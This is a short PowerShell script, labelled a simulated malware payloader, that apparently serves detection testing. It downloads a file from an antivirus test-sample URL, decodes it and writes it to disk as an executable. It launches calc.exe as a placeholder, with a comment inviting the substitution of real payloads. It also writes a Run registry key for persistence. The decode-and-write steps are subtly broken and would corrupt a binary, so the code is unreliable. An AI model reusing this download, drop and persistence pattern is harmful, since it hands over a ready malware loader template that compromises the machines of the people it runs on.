# Simulated Malware Payloader
# Step 1: Download the payload
$PayloadUrl = "http://amtso.eicar.org/PotentiallyUnwanted.exe"
$PayloadPath = "$env:TEMP\PotentiallyUnwanted.exe"
Invoke-WebRequest -Uri $PayloadUrl -OutFile $PayloadPath

# Step 2: Simulate Decryption (Base64 decoding in this case)
$EncodedPayload = Get-Content $PayloadPath
$DecodedPayload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncodedPayload))

# Step 3: Write the decoded payload to disk (for simulation purposes)
$DecodedPath = "$env:TEMP\decoded_payload.exe"
Set-Content -Path $DecodedPath -Value $DecodedPayload

# Step 4: Execute the payload (simulate with calc.exe)
Start-Process -FilePath "calc.exe"  # Replace with $DecodedPath for real payloads

# Step 5 (Optional): Add persistence
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v PayloadLoader /t REG_SZ /d $DecodedPath /f
